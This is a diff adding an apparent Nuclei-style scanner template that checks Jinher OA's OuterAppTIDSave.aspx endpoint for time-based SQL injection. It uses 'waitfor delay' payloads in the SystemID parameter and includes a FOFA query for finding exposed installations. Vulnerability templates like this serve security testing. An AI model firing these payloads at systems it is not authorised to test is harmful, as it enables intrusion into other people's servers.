@@ -1,0 +1,47 @@
+id: poc-yaml-jinher-outerapptidsave-aspx-sqli
+info:
+  name: "金和OA OuterAppTIDSave.aspx SQL注入"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 金和OA
+  metadata:
+    finger: 金和OA
+    fofa: app="金和网络-金和OA"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-base-page
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - id: check-sqli-vulnerability
+    method: GET
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID='waitfor+delay'0:0:5'--&OuterAppTID=1&AppTID=1"
+      - "{{BaseURL}}/c6/Jhsoft.Web.AddMenu/OuterAppTIDSave.aspx/?SystemID='waitfor+delay'0:0:8'--&OuterAppTID=1&AppTID=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "false"
+        part: body
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
